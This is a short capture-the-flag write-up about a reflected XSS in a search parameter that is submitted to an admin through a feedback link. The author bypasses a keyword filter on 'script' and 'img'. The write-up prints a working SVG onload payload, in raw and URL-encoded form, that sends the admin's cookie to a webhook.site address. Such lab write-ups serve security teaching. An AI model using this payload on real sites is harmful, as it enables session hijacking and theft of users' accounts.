# Challenge `Give me more than a simple WAF` Writeup

- Vulnerability:
    - XSS attack

- Where:
    - Feedback link input

- Impact:
    - Allows to steal remote user's cookie

## Steps to reproduce

This challenge is simmilar to the one before however with the particularity that keywords `script` and `img` are being filtered. 

We need to grab the admin's cookie and we know that the website is vulnerable to XSS attacks and that the admin will click on the link we submit on the feadback feature by taking advantage of search URL parameter (`?search=`). 

Again by using a webhook site we can create a malicious payload that will send the admin's cookie to our webhook. However, this time, we need to bypass the filter. To do so we can use the following payload: `<svg onload="location='https://webhook.site/<unique-id>/'+document.cookie"/>`. To ensure that the payload will be correctly executed, we must URL encode it. The final payload is then: `%3Csvg%20onload%3D%22location%3D%27https%3A%2F%2Fwebhook.site%2F<unique-id>%2F%27%2Bdocument.cookie%22%2F%3E`. Finally, we append this encoded payload to the search URL parameter and submit it to the admin.

The admin will then click on the link and automatically make a search query with the payload that will send a request to our webhook site with the cookie appended. In the webhook site we will see a GET request and then we only need to URL decode the cookie to get the flag. The flag will be after `/SECRET=`.
